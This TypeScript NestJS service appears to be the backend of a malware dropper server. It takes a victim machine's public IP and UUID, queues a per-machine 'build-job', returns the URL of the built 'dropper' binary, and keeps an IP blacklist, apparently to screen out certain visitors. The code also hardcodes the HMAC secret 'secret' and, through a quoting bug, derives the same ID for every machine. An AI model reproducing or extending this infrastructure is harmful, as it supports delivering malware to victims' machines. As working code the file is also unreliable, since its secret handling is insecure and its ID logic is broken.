import { Injectable } from '@nestjs/common';
import { InjectQueue } from '@nestjs/bull';
import { Queue } from 'bull';
import { MachineInfo } from './machine.interface';
import { ConfigService } from '@nestjs/config';
import { InjectRepository } from '@nestjs/typeorm';

import { Repository } from 'typeorm';
import { BlacklistedIp } from '../entities/backlisted-ip.entity';
import { createHmac } from 'node:crypto';
import { UrlRegistry } from '../entities/url-registry.entity';
const SECRET = 'secret';

@Injectable()
export class BuilderService {
  constructor(
    private readonly configService: ConfigService,
    @InjectQueue('build') private buildQueue: Queue,
    @InjectRepository(BlacklistedIp)
    private blacklistedIpRepository: Repository<BlacklistedIp>,
    @InjectRepository(UrlRegistry)
    private urlRegistryRepository: Repository<UrlRegistry>,
  ) {}

  async build(info: MachineInfo) {
    console.log('qdsqds');
    // if (
    //   await this.blacklistedIpRepository.findOne({
    //     where: { ip: info.publicIp },
    //   })
    // ) {
    //   console.warn(`ip ${info.publicIp} is blacklisted`);
    // }

    const dropperId = createHmac('sha256', SECRET)
      .update('${info.publicIp}${info.uuid}')
      .digest('hex');

    await this.buildQueue.add('build-job', {
      machineData: info,
      dropperId,
    });

    return { dropperId };
  }

  async getBinaryFile(dropperId: string) {
    const url = await this.urlRegistryRepository.findOne({
      where: { dropperId },
    });

    if (!url) {
      throw new Error('Dropper not found');
    }

    return url.url;
  }

  async createBlacklist(ip: string) {
    const blacklistedIp = new BlacklistedIp();
    blacklistedIp.ip = ip;
    await this.blacklistedIpRepository.save(blacklistedIp);
  }

  async getBlacklist() {
    return await this.blacklistedIpRepository.find();
  }

  async removeBlacklist(ip: string) {
    await this.blacklistedIpRepository.delete({ ip });
  }

  async clearBlacklist() {
    await this.blacklistedIpRepository.clear();
  }
}
